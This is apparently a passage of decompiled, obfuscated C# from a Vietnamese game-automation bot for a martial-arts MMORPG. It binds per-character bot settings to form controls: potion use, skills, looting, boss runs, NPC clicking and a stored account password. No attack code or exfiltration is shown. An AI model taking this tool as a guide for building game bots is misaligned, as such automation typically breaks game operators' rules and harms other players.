		FormDame.int_7 = FormDame.int_6;
		checkBoxDameMacdinh.Checked = FormDame.int_6 > 0;
		checkBoxdamekethop.Checked = FormDame.int_14 > 0;
		checkBoxNPC.Checked = int_8 > 0;
		if (int_42 <= 0)
		{
			checkBoxChetnamIm.ForeColor = Color.Black;
			checkBoxChetnamIm.Checked = false;
		}
		else
		{
			checkBoxChetnamIm.ForeColor = Color.DarkRed;
			checkBoxChetnamIm.Checked = int_41 > 0;
		}
		for (int num22 = 0; num22 < FormChayBoss.string_2.GetLength(0); num22++)
		{
			comboBoxNoiBoss.Items.Add(FormChayBoss.string_2[num22, 0]);
		}
		comboBoxNoiBoss.Text = FormChayBoss.string_2[0, 0];
		for (int num23 = 0; num23 < Class5.struct28_0.Length; num23++)
		{
			comboBoxBosSatthu.Items.Add(Class5.struct28_0[num23].bossDisplayName);
		}
		comboBoxBosSatthu.Text = Class5.struct28_0[0].bossDisplayName;
		checkBoxKhongLuuruong.Checked = Class5.int_1 > 0;
		checkBoxBossSTtuhuy.Checked = Class5.int_0 > 0;
		checkBoxGhepSTG.Checked = Class5.int_2 > 0;
		if (string_11 != null && string_11 != string.Empty)
		{
			textBoxTenacTimVST.Text = string_11;
		}
		checkBoxBaokenhbang.Checked = int_45 > 0;
		checkBoxRoom.Checked = int_46 > 0;
		baodskenhbang.Checked = int_129 > 0;
		textBoxThoigianVST.Text = int_47.ToString();
		textBoxNhapSLTest.Text = FormLocdoTest.int_2.ToString();
		textBoxNhapSoluongClickNPC.Text = FormClickNPC.int_6.ToString();
		checkBoxNhapSLClickNpc.Checked = FormClickNPC.int_5 > 0;
		checkBoxXoaMn.Checked = FormClickNPC.int_7 > 0;
		textBoxXoaMn.Text = FormClickNPC.int_8.ToString();
		if (Class40.string_0 != null && Class40.string_0 != string.Empty)
		{
			string item3 = Class1.smethod_1(Class40.string_0, 1);
			comboBoxTenHieuThuocTamtru.Items.Add(item3);
			comboBoxTenHieuThuocTamtru.Text = item3;
		}
		textBoxTamMonDaiMapId.Text = int_30.ToString();
		int_28 = 0;
		for (int num24 = 0; num24 < string_17.Length; num24++)
		{
			comboBoxCTC.Items.Add(string_17[num24]);
		}
		comboBoxCTC.Text = string_17[int_28];
		if (Class40.uint_0 == null)
		{
			Class40.uint_0 = new uint[2];
		}
		textBoxToadoHieuthuocTamtru.Text = Class40.uint_0[0] + "," + Class40.uint_0[1];
		if (Class40.uint_1 == null)
		{
			Class40.uint_1 = new uint[2];
		}
		textBoxCongTamtru.Text = Class40.uint_1[0] + "," + Class40.uint_1[1];
		method_1();
		FormLogin.string_6 = new string[10];
		for (int num25 = 0; num25 < FormLogin.string_6.GetLength(0); num25++)
		{
			string text7 = "Phân đà Số " + num25;
			for (int num26 = 0; num26 < 12; num26++)
			{
				text7 = text7 + "|Server " + (num26 + 1);
			}
			FormLogin.string_6[num25] = text7;
		}
		FormCompatibility.string_0 = FormCompatibility.smethod_0();
		bool_20 = FormCompatibility.smethod_2(FormCompatibility.string_0);
		Class72.string_3 = Class72.smethod_0(Class72.string_1);
		Class72.string_4 = Class72.smethod_0(Class72.string_0);
		Class72.string_5 = Class72.smethod_0(Class72.string_2);
		Class72.uint_0 = Class72.smethod_2(Class72.string_3);
		Class72.uint_1 = Class72.smethod_2(Class72.string_4);
		for (int num27 = 0; num27 < string_18.GetLength(0); num27++)
		{
			comboBoxTHP.Items.Add(string_18[num27, 0]);
		}
		comboBoxTHP.Text = string_18[0, 0];
		for (int num28 = 0; num28 < string_19.GetLength(0); num28++)
		{
			comboBoxPhuong.Items.Add(string_19[num28, 0]);
		}
		comboBoxPhuong.Text = string_19[0, 0];
		textBoxTimerPT.Text = Class69.int_2[1].ToString();
		checkBoxChoPTdanhsach.Checked = Class69.int_2[0] > 0;
		checkBoxPhimTat.Checked = int_69 > 0;
		checkBoxThu.Checked = int_135 > 0;
		timer_3.Interval = 200;
		timer_3.Enabled = true;
		base.TopMost = true;
		bool_16 = true;
		bool_23 = true;
		bool flag = false;
		string text8 = Class56.smethod_0();
		if (text8 == null || text8 == string.Empty)
		{
			text8 = Class66.smethod_7("PathGame", 0);
			flag = true;
		}
		if (text8 != null && text8 != string.Empty)
		{
			if (!flag)
			{
				string text9 = Class66.smethod_7("PathGame", 0);
				if (text8 != text9)
				{
					Class66.smethod_11(Class66.smethod_1(), "PathGame", text8, "", 0);
					Class24.smethod_71(text8, bool_0: false);
				}
			}
			string[] array2 = Class11.smethod_14(text8);
			Class56.string_18 = array2[0];
			Class56.string_19 = array2[1];
			textBoxThuMuc.Text = text8;
			Class2.smethod_7(Class56.string_18);
		}
		new Thread(GClass1.smethod_0).Start();
		new Thread(Class51.smethod_3).Start();
		new Thread(Class81.smethod_0).Start();
		new Thread(Class46.smethod_0).Start();
		new Thread(Class48.smethod_2).Start();
		new Thread(Class80.smethod_0).Start();
		Class37.smethod_107();
	}

	private void method_1()
	{
		((Control)tabPageThatthanh).Enabled = int_28 == 0;
		((Control)tabPageTamtru).Enabled = int_28 == 1;
		((Control)tabPageTamMondai).Enabled = int_28 == 2;
		tabControlThatThanh.SelectedIndex = int_28;
	}

	private void method_2(string string_69)
	{
		long_3 = DateTime.Now.Ticks - new TimeSpan(0, 0, 0, 10).Ticks;
		pictureBoxQC.Visible = false;
		richTextBoxStatus.Visible = true;
		richTextBoxStatus.Text = string_69;
	}

	private void listView1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			method_3(sender, e);
		}
		catch
		{
			method_2("Có lỗi Config của ac đang chọn, nên xóa hết tải lại auto.");
		}
	}

	private void method_3(object sender, MouseEventArgs e)
	{
		bool_21 = true;
		int num = Class87.smethod_4(listView1, e);
		if (num >= 0 && num <= listView1.Items.Count - 1 && characterAccountConfig_1 != null && num <= characterAccountConfig_1.Length - 1)
		{
			int num2 = Class87.smethod_2(listView1, num, characterAccountConfig_1);
			if (num2 >= 0)
			{
				int_83 = num;
				if (characterAccountConfig_1[num2].int_88 < 0 || string_30.Length <= characterAccountConfig_1[num2].int_88)
				{
					characterAccountConfig_1[num2].int_88 = 0;
				}
				characterAccountConfig_1[num2].gstruct58_0 = Class83.smethod_22(characterAccountConfig_1[num2]);
				CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num2];
				string text = Class83.smethod_18(characterAccountConfig);
				FormHaucanTuithuoc.int_0 = characterAccountConfig.int_136;
				FormRauria.int_0 = characterAccountConfig.int_136;
				FormRauria.string_0 = text;
				Class85.smethod_35();
				method_4(bool_35: true);
				bool_23 = false;
				comboBoxGiamCpu.Text = string_40[characterAccountConfig.int_89];
				if (int_42 > 0)
				{
					checkBoxChetnamIm.Checked = int_41 > 0;
				}
				else
				{
					checkBoxChetnamIm.Checked = characterAccountConfig.int_94 > 0;
				}
				if (characterAccountConfig.int_88 >= 0 && characterAccountConfig.int_88 < string_30.Length)
				{
					comboBoxUuTien.Text = string_30[characterAccountConfig.int_88];
				}
				else
				{
					comboBoxUuTien.Text = string_30[0];
				}
				if ((characterAccountConfig.int_88 == 1 || characterAccountConfig.int_88 == 2) && characterAccountConfig.gstruct47_0 == null)
				{
					characterAccountConfig.gstruct47_0 = new GStruct47[2];
				}
				comboBoxVukhi0.Items.Clear();
				comboBoxVukhi1.Items.Clear();
				string item = Class1.smethod_1(characterAccountConfig.gstruct47_0[0].string_0, 1);
				comboBoxVukhi0.Items.Add(item);
				comboBoxVukhi0.Text = item;
				item = Class1.smethod_1(characterAccountConfig.gstruct47_0[1].string_0, 1);
				comboBoxVukhi1.Items.Add(item);
				comboBoxVukhi1.Text = item;
				checkBoxMuaMauFree.Checked = characterAccountConfig.int_78 > 0;
				checkBoxVukhi0.Checked = characterAccountConfig.gstruct47_0[0].int_0 > 0;
				checkBoxVukhi1.Checked = characterAccountConfig.gstruct47_0[1].int_0 > 0;
				textBoxVukhi0.Text = characterAccountConfig.gstruct47_0[0].int_2.ToString();
				textBoxVukhi1.Text = characterAccountConfig.gstruct47_0[1].int_2.ToString();
				comboBoxVukhiKieu0.Text = string_41[characterAccountConfig.gstruct47_0[0].int_1];
				comboBoxVukhiKieu1.Text = string_41[characterAccountConfig.gstruct47_0[1].int_1];
				checkBoxBomHPDiem.Checked = characterAccountConfig.int_106[0] > 0;
				textBoxBomHPDiem.Text = characterAccountConfig.int_106[1].ToString();
				textBoxThoiGianBomHPDiem.Text = characterAccountConfig.int_106[2].ToString();
				textBoxSoLuongBomHPDiem.Text = characterAccountConfig.int_106[3].ToString();
				checkBoxBomMPDiem.Checked = characterAccountConfig.int_107[0] > 0;
				textBoxBomMPDiem.Text = characterAccountConfig.int_107[1].ToString();
				textBoxThoiGianBomMPDiem.Text = characterAccountConfig.int_107[2].ToString();
				textBoxSoLuongBomMPDiem.Text = characterAccountConfig.int_107[3].ToString();
				checkBoxBomHP.Checked = characterAccountConfig.int_109[0] > 0;
				textBoxHPBom.Text = characterAccountConfig.int_109[1].ToString();
				textBoxThoigianBomHP.Text = characterAccountConfig.int_109[2].ToString();
				textBoxSoluongBomHP.Text = characterAccountConfig.int_109[3].ToString();
				checkBoxHPTdp.Checked = characterAccountConfig.int_113[0] > 0;
				textBoxHpTDP.Text = characterAccountConfig.int_113[1].ToString();
				checkBoxUuTienBomCuuchuyen.Checked = characterAccountConfig.int_108 > 0;
				checkBoxMPBom.Checked = characterAccountConfig.int_111[0] > 0;
				textBoxMPBom.Text = characterAccountConfig.int_111[1].ToString();
				textBoxThoigianBomMP.Text = characterAccountConfig.int_111[2].ToString();
				textBoxSoluongBomMP.Text = characterAccountConfig.int_111[3].ToString();
				checkBoxMPTdp.Checked = characterAccountConfig.int_114[0] > 0;
				textBoxMPTdp.Text = characterAccountConfig.int_114[1].ToString();
				textBoxPass.Text = characterAccountConfig.string_15;
				checkBoxMua1.Checked = characterAccountConfig.int_71[0] > 0;
				textBoxSoluong1.Text = characterAccountConfig.int_71[2].ToString();
				string item2 = Class1.smethod_1(characterAccountConfig.string_11, 1);
				comboBoxMua1.Items.Add(item2);
				comboBoxMua1.Text = item2;
				checkBoxMua2.Checked = characterAccountConfig.int_72[0] > 0;
				textBoxSoluong2.Text = characterAccountConfig.int_72[2].ToString();
				item2 = Class1.smethod_1(characterAccountConfig.string_12, 1);
				comboBoxMua2.Items.Add(item2);
				comboBoxMua2.Text = item2;
				checkBoxMuaGiaiDoc.Checked = characterAccountConfig.int_73[0] > 0;
				textBoxSoluongMuaGiaiDoc.Text = characterAccountConfig.int_73[2].ToString();
				item2 = Class1.smethod_1(characterAccountConfig.string_13, 1);
				comboBoxMuaGiaiDoc.Items.Add(item2);
				comboBoxMuaGiaiDoc.Text = item2;
				checkBoxAnThuocLag.Checked = characterAccountConfig.int_63 > 0;
				checkBoxTDP_SL_Mau.Checked = characterAccountConfig.int_115 > 0;
				textBoxTDP_SL_Mau.Text = characterAccountConfig.int_116.ToString();
				checkBoxTDP_SL_Mana.Checked = characterAccountConfig.int_117 > 0;
				textBoxTDP_SL_Mana.Text = characterAccountConfig.int_118.ToString();
				checkBoxMau2.Checked = characterAccountConfig.int_110[0] > 0;
				comboBoxTenMau2.Text = Class1.smethod_1(characterAccountConfig.string_16, 1);
				textBoxRatioMau2.Text = characterAccountConfig.int_110[1].ToString();
				textBoxTimerMau2.Text = characterAccountConfig.int_110[2].ToString();
				textBoxSoluongMau2.Text = characterAccountConfig.int_110[3].ToString();
				checkBoxMana2.Checked = characterAccountConfig.int_112[0] > 0;
				comboBoxTenMana2.Text = Class1.smethod_1(characterAccountConfig.string_17, 1);
				textBoxRatioMana2.Text = characterAccountConfig.int_112[1].ToString();
				textBoxTimerMana2.Text = characterAccountConfig.int_112[2].ToString();
				textBoxSoluongMana2.Text = characterAccountConfig.int_112[3].ToString();
				checkBoxRuongBH.Checked = characterAccountConfig.int_79 > 0;
				checkBoxTuChuyenThuoc.Checked = characterAccountConfig.int_76[0] > 0;
				checkBoxBamPhimCong.Checked = characterAccountConfig.int_76[1] > 0;
				textBoxChuyenThuocMin.Text = characterAccountConfig.int_76[2].ToString();
				textBoxSoluongChuyenthuoc.Text = characterAccountConfig.int_76[3].ToString();
				comboBoxChuyenThuoc.Items.Clear();
				if (characterAccountConfig.string_14 != null && characterAccountConfig.string_14 != string.Empty)
				{
					string item3 = Class1.smethod_1(characterAccountConfig.string_14, 1);
					comboBoxChuyenThuoc.Items.Add(item3);
					comboBoxChuyenThuoc.Text = item3;
				}
				checkBoxMuaKTC.Checked = characterAccountConfig.int_77 > 0;
				checkBoxHoasonMuathuoc.Checked = characterAccountConfig.int_105 > 0;
				checkBoxVeThanhKhiPKlon.Checked = characterAccountConfig.int_104[0] > 0;
				comboBoxPk.Text = characterAccountConfig.int_104[1].ToString();
				checkBoxTiepCan.Checked = characterAccountConfig.int_95 > 0;
				checkBoxTamQuet.Checked = characterAccountConfig.int_98 > 0;
				checkBoxTuCastBua.Checked = characterAccountConfig.int_119 > 0;
				textBoxKhoangCachTiepcan.Text = characterAccountConfig.int_96.ToString();
				textBoxPhamvi.Text = characterAccountConfig.int_99.ToString();
				checkBoxNgamyBuff.Checked = characterAccountConfig.int_101[0] > 0;
				textBoxNgamyBuff.Text = characterAccountConfig.int_101[3].ToString();
				textBoxTimerNgamyBuff.Text = characterAccountConfig.int_101[4].ToString();
				checkBoxNhatdo.Checked = characterAccountConfig.int_61 > 0;
				checkBoxNhatdoDichuyenGan.Checked = characterAccountConfig.int_51 > 0;
				comboBoxNhatdo.Text = string_28[characterAccountConfig.int_62];
				textBoxPhamviNhat.Text = characterAccountConfig.int_52.ToString();
				checkBoxLuomrac.Checked = characterAccountConfig.int_54 > 0;
				checkBoxMangtheotien.Checked = characterAccountConfig.int_65 > 0;
				textBoxTienMangtheo.Text = characterAccountConfig.int_66.ToString();
				if (characterAccountConfig.int_53 != null)
				{
					checkBoxRuong0.Checked = characterAccountConfig.int_53[0] > 0;
					checkBoxRuong1.Checked = characterAccountConfig.int_53[1] > 0;
					checkBoxRuong2.Checked = characterAccountConfig.int_53[2] > 0;
					checkBoxRuong3.Checked = characterAccountConfig.int_53[3] > 0;
				}
				checkBoxXepdo.Checked = characterAccountConfig.int_37 > 0;
				textBoxTimeXepdo.Text = characterAccountConfig.int_38.ToString();
				comboBoxXuongNgua.Text = string_31[characterAccountConfig.int_93];
				checkBoxTuGiaidoc.Checked = characterAccountConfig.int_74[0] > 0;
				textBoxTimerBomMagic.Text = characterAccountConfig.int_74[1].ToString();
				textBoxSoluongBomMagic.Text = characterAccountConfig.int_74[2].ToString();
				if (!AuxiliaryMachineManager.bool_7 && (!AuxiliaryMachineManager.bool_6 || Class59.smethod_0(Class39.smethod_0(characterAccountConfig)) == null))
				{
					if (int_137 == 1)
					{
						checkBoxDiemTapket.Enabled = true;
						checkBoxDiemTapket.Text = string_48;
						checkBoxDenToadoUser.Enabled = true;
						checkBoxDenToadoUser.Text = string_47;
						checkBoxAccChinhHauDoanh.Enabled = true;
						checkBoxAccChinhHauDoanh.Text = string_46;
						int_137 = 0;
					}
				}
				else
				{
					if (int_137 != 1)
					{
						if (string_48 == null)
						{
							string_48 = checkBoxDiemTapket.Text;
						}
						if (string_47 == null)
						{
							string_47 = checkBoxDenToadoUser.Text;
						}
						if (string_46 == null)
						{
							string_46 = checkBoxAccChinhHauDoanh.Text;
						}
						string text2 = "ᒽ㍆ᒛᓦᓣᕮᓜᒛᓝ㍚ᓤᒛᓜᓟᓢᓜᓨᓠ";
						checkBoxDiemTapket.Enabled = false;
						checkBoxDiemTapket.Text = Class11.smethod_54(text2);
						checkBoxDenToadoUser.Enabled = false;
						checkBoxDenToadoUser.Text = Class11.smethod_54(text2);
						checkBoxAccChinhHauDoanh.Enabled = false;
						checkBoxAccChinhHauDoanh.Text = Class11.smethod_54(text2);
					}
					int_137 = 1;
				}
				if (AuxiliaryMachineManager.bool_3)
				{
					checkBoxTheoSau.Checked = false;
					checkBoxTheoSau.Enabled = false;
				}
				else
				{
					checkBoxTheoSau.Checked = characterAccountConfig.int_68[0] > 0;
					textBoxKhoangCachTheoSau.Text = characterAccountConfig.int_68[1].ToString();
					comboBoxTheoSau.Text = Class1.smethod_1(characterAccountConfig.string_9, 1);
				}
				bool flag = text == "DUONGMON";
				bool enabled = text == "NGAMY";
				bool flag2 = text == "CONLON";
				bool enabled2 = text == "NGUDOC" || text == "THIENNHAN" || flag2;
				bool flag3 = text == "VODANG";
				bool flag4 = text == "THIENNHAN";
				checkBoxTuGiaiBua.Enabled = flag3;
				checkBoxTuGiaiBua.Checked = characterAccountConfig.int_80 > 0 && flag3;
				checkBoxTNXuatChieu120.Enabled = flag4;
				checkBoxTNXuatChieu120.Checked = characterAccountConfig.int_83 > 0 && flag4;
				checkBoxConLon.Enabled = flag2;
				checkBoxTTDT.Enabled = flag2;
				checkBoxConLon.Checked = characterAccountConfig.int_84[0] > 0 && flag2;
				checkBoxTTDT.Checked = characterAccountConfig.int_84[1] > 0 && flag2;
				checkBoxDuongMonBoom.Checked = flag && characterAccountConfig.int_128[0] > 0;
				checkBoxDuongMonBoom.Enabled = flag;
				checkBoxNgamyBuff.Enabled = enabled;
				textBoxNgamyBuff.Enabled = enabled;
				textBoxTimerNgamyBuff.Enabled = enabled;
				buttonNgaMybuff.Enabled = enabled;
				checkBoxTuCastBua.Enabled = enabled2;
				buttonCashBua.Enabled = enabled2;
				checkBoxQuangThuoc.Checked = characterAccountConfig.int_131[0] > 0;
				checkBoxCaudame.Checked = characterAccountConfig.int_130[0] > 0;
				textBoxCaudame.Text = characterAccountConfig.int_130[1].ToString();
				checkBoxTienSkill.Checked = characterAccountConfig.gstruct50_0.int_0 > 0;
				comboBoxGanChieuTrai.Items.Clear();
				comboBoxGanChieuPhai.Items.Clear();
				comboBoxChuyenPhai1.Items.Clear();
				comboBoxChuyenPhai2.Items.Clear();
				comboBoxChuyenPhai3.Items.Clear();
				comboBoxChuyenTrai1.Items.Clear();
				comboBoxChuyenTrai2.Items.Clear();
				comboBoxChuyenTrai3.Items.Clear();
				comboBoxGapBoss.Items.Clear();
				comboBoxTranphai1.Items.Clear();
				comboBoxTranphai2.Items.Clear();
				comboBoxTranphai3.Items.Clear();
				int num3 = 0;
				while (characterAccountConfig.gstruct58_0 != null && characterAccountConfig.gstruct58_0.Length > num3)
				{
					string item4 = characterAccountConfig.gstruct58_0[num3].string_0;
					comboBoxGanChieuTrai.Items.Add(item4);
					comboBoxGanChieuPhai.Items.Add(item4);
					if (characterAccountConfig.int_138[1] == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxGanChieuTrai.Text = item4;
					}
					if (characterAccountConfig.int_139[1] == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxGanChieuPhai.Text = item4;
					}
					comboBoxChuyenTrai1.Items.Add(item4);
					comboBoxChuyenTrai2.Items.Add(item4);
					comboBoxChuyenTrai3.Items.Add(item4);
					comboBoxChuyenPhai1.Items.Add(item4);
					comboBoxChuyenPhai2.Items.Add(item4);
					comboBoxChuyenPhai3.Items.Add(item4);
					comboBoxTranphai1.Items.Add(item4);
					comboBoxTranphai2.Items.Add(item4);
					comboBoxTranphai3.Items.Add(item4);
					if (characterAccountConfig.int_140[1] == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxTranphai1.Text = item4;
					}
					if (characterAccountConfig.int_141[1] == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxTranphai2.Text = item4;
					}
					if (characterAccountConfig.int_142[1] == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxTranphai3.Text = item4;
					}
					if (characterAccountConfig.gstruct48_0[0].int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxChuyenTrai1.Text = item4;
					}
					if (characterAccountConfig.gstruct48_0[1].int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxChuyenTrai2.Text = item4;
					}
					if (characterAccountConfig.gstruct48_0[2].int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxChuyenTrai3.Text = item4;
					}
					if (characterAccountConfig.gstruct48_1[0].int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxChuyenPhai1.Text = item4;
					}
					if (characterAccountConfig.gstruct48_1[1].int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxChuyenPhai2.Text = item4;
					}
					if (characterAccountConfig.gstruct48_1[2].int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxChuyenPhai3.Text = item4;
					}
					comboBoxGapBoss.Items.Add(item4);
					if (characterAccountConfig.gstruct48_2.int_1 == characterAccountConfig.gstruct58_0[num3].int_1)
					{
						comboBoxGapBoss.Text = item4;
					}
					num3++;
				}
				checkBoxGanChieuTrai.Checked = characterAccountConfig.int_138[0] > 0;
				checkBoxGanChieuPhai.Checked = characterAccountConfig.int_139[0] > 0;
				checkBoxTranphai1.Checked = characterAccountConfig.int_140[0] > 0;
				checkBoxTranphai2.Checked = characterAccountConfig.int_141[0] > 0;
				checkBoxTranphai3.Checked = characterAccountConfig.int_142[0] > 0;
				textBoxTranphai1.Text = characterAccountConfig.int_140[2].ToString();
				textBoxTranphai2.Text = characterAccountConfig.int_141[2].ToString();
				textBoxTranphai3.Text = characterAccountConfig.int_142[2].ToString();
				comboBoxKieu1.Text = string_41[characterAccountConfig.gstruct48_0[0].int_3];
				comboBoxKieu2.Text = string_41[characterAccountConfig.gstruct48_0[1].int_3];
				comboBoxKieu3.Text = string_41[characterAccountConfig.gstruct48_0[2].int_3];
				checkBoxChuyenTrai1.Checked = characterAccountConfig.gstruct48_0[0].int_0 > 0;
				checkBoxChuyenTrai2.Checked = characterAccountConfig.gstruct48_0[1].int_0 > 0;
				checkBoxChuyenTrai3.Checked = characterAccountConfig.gstruct48_0[2].int_0 > 0;
				textBoxChuyenTrai1.Text = characterAccountConfig.gstruct48_0[0].int_2.ToString();
				textBoxChuyenTrai2.Text = characterAccountConfig.gstruct48_0[1].int_2.ToString();
				textBoxChuyenTrai3.Text = characterAccountConfig.gstruct48_0[2].int_2.ToString();
				checkBoxChuyenPhai1.Checked = characterAccountConfig.gstruct48_1[0].int_0 > 0;
				checkBoxChuyenPhai2.Checked = characterAccountConfig.gstruct48_1[1].int_0 > 0;
				checkBoxChuyenPhai3.Checked = characterAccountConfig.gstruct48_1[2].int_0 > 0;
				textBoxChuyenPhai1.Text = characterAccountConfig.gstruct48_1[0].int_2.ToString();
				textBoxChuyenPhai2.Text = characterAccountConfig.gstruct48_1[1].int_2.ToString();
				textBoxChuyenPhai3.Text = characterAccountConfig.gstruct48_1[2].int_2.ToString();
				checkBoxGapBossChieu.Checked = characterAccountConfig.gstruct48_2.int_0 > 0;
				checkBoxGapBossNL.Checked = characterAccountConfig.gstruct48_2.int_3 > 0;
				textBoxGapBoss.Text = characterAccountConfig.gstruct48_2.int_2.ToString();
				string_53 = characterAccountConfig.string_0;
				comboBoxClickNPC.Text = Class1.smethod_1(characterAccountConfig.string_0, 1);
				checkBoxClickNPCmenu.Checked = characterAccountConfig.int_8 > 0;
				textBoxClickNPCMenu.Text = Class11.smethod_69(characterAccountConfig.int_9);
				if (characterAccountConfig.int_7 != null)
				{
					checkBoxClickNPCSolan.Checked = characterAccountConfig.int_7[0] > 0;
					textBoxClickNPCSolan.Text = characterAccountConfig.int_7[1].ToString();
				}
				buttonClickNpcSingle.Enabled = Class75.smethod_3(characterAccountConfig, Class75.uint_48, 4) == 0;
				textBoxClickNPCTocdo.Text = characterAccountConfig.int_10.ToString();
				textBoxLocTocdo.Text = characterAccountConfig.int_11.ToString();
				comboBoxDoSatcuuSat.Text = string_39[characterAccountConfig.int_33];
				checkBoxTrain.Checked = characterAccountConfig.int_25 > 0;
				checkBoxTucheHT.Checked = characterAccountConfig.int_26 > 0;
				checkBoxDanhquaiTrain.Checked = characterAccountConfig.int_27 > 0;
				checkBoxDanhQuaiTrenduongdi.Checked = characterAccountConfig.int_30 > 0;
				checkBoxQuayquai.Checked = characterAccountConfig.int_31 > 0;
				checkBoxTDPHettien.Checked = characterAccountConfig.int_28 > 0;
				checkBoxTDPHettien.Enabled = characterAccountConfig.int_26 > 0;
				checkBoxToadoVong.Checked = characterAccountConfig.int_29 > 0;
				listViewTrain.Items.Clear();
				if (characterAccountConfig.uint_0 != null)
				{
					for (num3 = 0; num3 < characterAccountConfig.uint_0.GetLength(0); num3++)
					{
						method_21(listViewTrain, new uint[2]
						{
							characterAccountConfig.uint_0[num3, 0],
							characterAccountConfig.uint_0[num3, 1]
						});
					}
				}
				textBoxMapName.Text = Class39.smethod_1(characterAccountConfig.int_32, bool_0: true);
				checkBoxTranhBossVang.Checked = characterAccountConfig.int_57 > 0;
				checkBoxTDPSaimap.Checked = characterAccountConfig.int_59 > 0;
				checkBoxTTL.Checked = characterAccountConfig.int_58 > 0;
				textBoxSLThoat.Text = characterAccountConfig.int_18.ToString();
				checkBoxSLThoat.Checked = characterAccountConfig.int_19 > 0;
				checkBoxAnThuocTDD.Checked = characterAccountConfig.int_64[0] > 0;
				textBoxTocdoDanh.Text = characterAccountConfig.int_64[1].ToString();
				checkBoxOtrong.Checked = characterAccountConfig.int_60[0] > 0;
				comboBoxOtrong.Text = string_29[characterAccountConfig.int_60[1]];
				textBoxIdMua.Text = characterAccountConfig.int_132.ToString();
				checkBoxTuChayVA.Checked = characterAccountConfig.int_122 > 0;
				checkBoxTuClickNTT.Checked = characterAccountConfig.int_123 > 0;
				string text3 = string.Empty;
				if (characterAccountConfig.int_125 != null && characterAccountConfig.int_125.Length == 5 && characterAccountConfig.int_125[2] > 0)
				{
					text3 = "( " + characterAccountConfig.int_125[3] / 256 + "," + characterAccountConfig.int_125[4] / 512 + " ) " + Class39.smethod_1(characterAccountConfig.int_125[2], bool_0: true);
				}
				textBoxToadoDen.Text = text3;
				checkBoxDenToadoUser.Checked = characterAccountConfig.int_125[0] > 0;
				checkBoxBatdauVanSuthong.Checked = characterAccountConfig.bool_54;
				checkBoxVSTDong2.Checked = characterAccountConfig.int_135 > 0;
				checkBoxChayTinsu.Checked = characterAccountConfig.int_20[0] > 0;
				comboBoxTinSu.Text = string_33[characterAccountConfig.int_20[1]];
				checkBoxChaydanhvong.Checked = characterAccountConfig.bool_4;
				checkBoxChayPKNguoidung.Checked = characterAccountConfig.int_34 > 0;
				checkBoxMuathuocPK.Checked = characterAccountConfig.bool_5;
				method_29(characterAccountConfig.int_20[0] <= 0 && characterAccountConfig.int_20[1] > 0);
				comboBoxTinSu.Enabled = characterAccountConfig.int_20[0] <= 0;
				checkBoxChoPTdanhsach.Enabled = characterAccountConfig.int_20[1] == 0;
				comboBoxTinSu.Enabled = characterAccountConfig.int_20[1] == 0;
				if (FormChayBoss.string_2 != null)
				{
					if (characterAccountConfig.int_0 < 0 || FormChayBoss.string_2.GetLength(0) <= characterAccountConfig.int_0)
					{
						characterAccountConfig.int_0 = 0;
						characterAccountConfig_1[num2].int_0 = 0;
					}
					comboBoxNoiBoss.Text = FormChayBoss.string_2[characterAccountConfig.int_0, 0];
					buttonDenDiemKetiep.Text = "Đến điểm kế tiếp" + Class56.string_7 + "( " + (characterAccountConfig.int_0 + 1) + " )";
				}
				checkBoxTuChayBoss.Checked = characterAccountConfig.bool_1;
				if (characterAccountConfig.int_121 != null)
				{
					checkBoxTudongPT.Checked = characterAccountConfig.int_121[0] > 0;
					if (characterAccountConfig.int_121[1] <= 0)
					{
						checkBoxTudongPT.ForeColor = Color.Black;
					}
					else
					{
						checkBoxTudongPT.ForeColor = Color.Blue;
					}
				}
				checkBoxBosBaobos.Checked = characterAccountConfig.int_1 > 0;
				checkBoxGanTenthuoc.Checked = characterAccountConfig.int_75[0] > 0;
				textBoxOso1.Text = characterAccountConfig.int_75[1].ToString();
				textBoxOso2.Text = characterAccountConfig.int_75[2].ToString();
				textBoxOso3.Text = characterAccountConfig.int_75[3].ToString();
				checkBoxNhatqua.Checked = characterAccountConfig.gstruct49_0.int_0 > 0;
				checkBoxGioClick.Checked = characterAccountConfig.gstruct49_0.int_2 > 0;
				numericUpDownHH.Value = characterAccountConfig.gstruct49_0.int_3;
				numericUpDownMM.Value = characterAccountConfig.gstruct49_0.int_4;
				numericUpDownSS.Value = characterAccountConfig.gstruct49_0.int_5;
				textBoxPhamviNhatqua.Text = characterAccountConfig.gstruct49_0.int_1.ToString();
				checkBoxThanhTruot.Checked = characterAccountConfig.gstruct49_0.int_6 > 0;
				textBoxThoiGianTruot.Text = characterAccountConfig.gstruct49_0.int_7.ToString();
				checkBoxDungCodinh.Checked = characterAccountConfig.gstruct49_0.int_8 > 0;
				textBoxThoiGianTruot.Enabled = characterAccountConfig.gstruct49_0.int_6 > 0;
				comboBoxNhatQua.Items.Clear();
				string text4 = Class1.smethod_1(characterAccountConfig.gstruct49_0.string_0, 1);
				if (text4 != null && text4 != string.Empty)
				{
					comboBoxNhatQua.Items.Add(text4);
					comboBoxNhatQua.Text = text4;
				}
				checkBoxBossSatthu.Checked = characterAccountConfig.int_133[0] > 0;
				comboBoxBosSatthu.Text = Class5.struct28_0[characterAccountConfig.int_133[3]].bossDisplayName;
				checkBoxONha.Checked = characterAccountConfig.int_133[4] > 0;
				checkBoxBossSTKhongLamHaucan.Checked = characterAccountConfig.int_134 > 0;
				checkBoxBanVpham.Checked = characterAccountConfig.int_12[0] > 0;
				buttonBanVatphamRac.Enabled = characterAccountConfig.int_12[0] <= 0;
				comboBoxBanVatPham.Text = string_34[characterAccountConfig.int_12[1]];
				checkBoxMuaNgamy.Checked = characterAccountConfig.int_70 > 0;
				Thread.Sleep(30);
				bool_23 = true;
				return;
			}
		}
		FormRauria.int_0 = -1;
		FormHaucanTuithuoc.int_0 = -1;
		int_83 = -1;
